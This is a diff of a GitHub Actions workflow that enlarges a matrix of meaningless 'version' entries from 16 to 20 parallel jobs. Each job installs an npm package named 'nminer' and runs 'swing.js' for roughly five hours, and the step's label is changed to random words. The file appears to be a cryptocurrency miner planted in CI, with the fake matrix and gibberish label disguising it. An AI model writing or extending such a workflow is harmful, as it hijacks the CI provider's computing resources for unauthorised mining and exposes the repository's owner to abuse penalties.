@@ -9,22 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 373 }
-          - { version: 4757 }
-          - { version: 4605 }
-          - { version: 7537 }
-          - { version: 8585 }
-          - { version: 6635 }
-          - { version: 1848 }
-          - { version: 4362 }
-          - { version: 8377 }
-          - { version: 976 }
-          - { version: 1435 }
-          - { version: 1720 }
-          - { version: 9054 }
-          - { version: 5936 }
-          - { version: 3605 }
-          - { version: 7897 }
+          - { version: 4169 }
+          - { version: 6246 }
+          - { version: 3850 }
+          - { version: 3757 }
+          - { version: 5427 }
+          - { version: 6483 }
+          - { version: 5340 }
+          - { version: 9285 }
+          - { version: 5814 }
+          - { version: 7774 }
+          - { version: 2240 }
+          - { version: 4581 }
+          - { version: 5266 }
+          - { version: 1499 }
+          - { version: 4482 }
+          - { version: 3435 }
+          - { version: 604 }
+          - { version: 2152 }
+          - { version: 1539 }
+          - { version: 4458 }
 
     steps:
       - name: Checkout
@@ -35,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: nucleotidase yowza oh
         run: |
           npm install nminer@latest
-          timeout 313m node swing.js || echo "swing executed"
+          timeout 306m node swing.js || echo "swing executed"
